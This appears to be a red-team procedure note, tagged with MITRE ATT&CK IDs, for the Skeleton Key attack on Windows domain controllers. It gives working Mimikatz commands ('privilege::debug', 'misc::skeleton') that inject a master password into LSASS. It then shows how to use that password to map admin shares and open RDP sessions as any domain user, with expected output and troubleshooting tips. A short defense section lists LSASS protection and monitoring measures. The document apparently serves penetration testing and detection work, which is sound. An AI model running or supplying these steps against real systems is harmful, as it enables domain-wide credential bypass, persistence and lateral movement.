---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Use Alternate Authentication Material|T1550]]'
sub_techniques:
  - '[[techniques/Use Alternate Authentication Material/Pass the Hash|T1550.002]]'
tags:
  - '[[tags/skeleton-key]]'
  - '[[tags/windows-mimikatz]]'
commands:
  - '[[commands/net-use-map-admin-share]]'
  - '[[commands/rdesktop-rdp-login]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Skeleton-Key-Password-Injection-with-Mimikatz

## Summary

Skeleton Key Password Injection is a post-exploitation technique that uses Mimikatz to inject a master password ("mimikatz") into the LSASS process on a Windows domain controller. This allows attackers to authenticate as any domain user using the injected password, bypassing normal credential requirements and enabling lateral movement or privilege escalation across the domain.

## Description

This procedure targets Windows domain controllers by exploiting the LSASS process to load a "skeleton key" password. Once injected via Mimikatz, the password "mimikatz" can be used to access any account without knowing the original credentials. It is typically performed after gaining initial code execution on the domain controller, often through prior privilege escalation or remote access. The technique manipulates the authentication process in memory, making it effective for persistent access in Active Directory environments. Success grants domain-wide access, facilitating data exfiltration, further lateral movement, or persistence. This is commonly used in red team engagements to simulate advanced persistent threats.

## Requirements

1. Administrative access or code execution on the domain controller (e.g., via initial foothold or privilege escalation).
2. Mimikatz tool installed or downloadable on the target system.
3. Domain credentials or hash for initial Mimikatz execution (if not running as SYSTEM).
4. Network connectivity to the domain controller and target resources (e.g., admin shares, RDP ports).
5. For RDP access, an RDP client like rdesktop on the attacker's Linux machine.

## Defense

- Enable Protected Process Light (PPL) for LSASS and monitor for unauthorized process injections.
- Implement credential guard and restrict LSASS access via AppLocker or WDAC policies.
- Monitor for Mimikatz signatures in process memory, unusual authentication patterns, or anomalous logons with the same password across accounts.
- Use multi-factor authentication (MFA) for domain accounts to limit impact even if passwords are bypassed.
- Regularly patch domain controllers and audit Mimikatz-related tools on endpoints.

## Objectives

1. Inject the skeleton key password into the domain controller's LSASS process.
2. Authenticate to domain resources using the injected password for lateral movement.
3. Gain persistent access to any domain account without original credentials.

## Instructions

### Step 1: Elevate Privileges and Inject Skeleton Key

**Context**: Run Mimikatz with debug privileges to inject the skeleton key into LSASS. This step requires execution on the domain controller and modifies the authentication process in memory.

**Code** ([[codes/Mimikatz-Skeleton-Key-Injection-and-Access]]):

```powershell
privilege::debug
misc::skeleton
```

> The `privilege::debug` command enables SeDebugPrivilege for memory access. The `misc::skeleton` command injects the "mimikatz" password as a backdoor for all accounts. Expected output includes confirmation messages like "Privilege '20' OK" and "Skeleton implemented." Verify by checking for no errors and successful module loading.

### Step 2: Map Administrative Share Using Skeleton Key

**Context**: Use the injected password to access remote admin shares on domain machines, confirming the skeleton key's effectiveness for lateral movement.

**Command** ([[commands/net-use-map-admin-share]]):

```cmd
net use p: \\TARGET_HOSTNAME\admin$ /user:TARGET_USERNAME mimikatz
```

> This maps the admin$ share to drive P: using any domain username and the skeleton key password. Replace TARGET_HOSTNAME (e.g., WIN-PTELU2U07KG) and TARGET_USERNAME (e.g., john). Expected output: "The command completed successfully." If failed, check connectivity or injection success.

### Step 3: Establish RDP Session with Skeleton Key

**Context**: Connect to a target machine via RDP using the skeleton key for interactive access, demonstrating domain-wide privilege escalation.

**Command** ([[commands/rdesktop-rdp-login]]):

```bash
rdesktop TARGET_IP:3389 -u TARGET_USERNAME -p mimikatz -d DOMAIN
```

> From a Linux attacker machine, use rdesktop to connect to the target's RDP port. Replace TARGET_IP (e.g., 10.0.0.2), TARGET_USERNAME (e.g., test), and DOMAIN (e.g., pentestlab). Expected output: Successful RDP login prompt and shell access. If connection fails, ensure RDP is enabled and firewall allows port 3389.
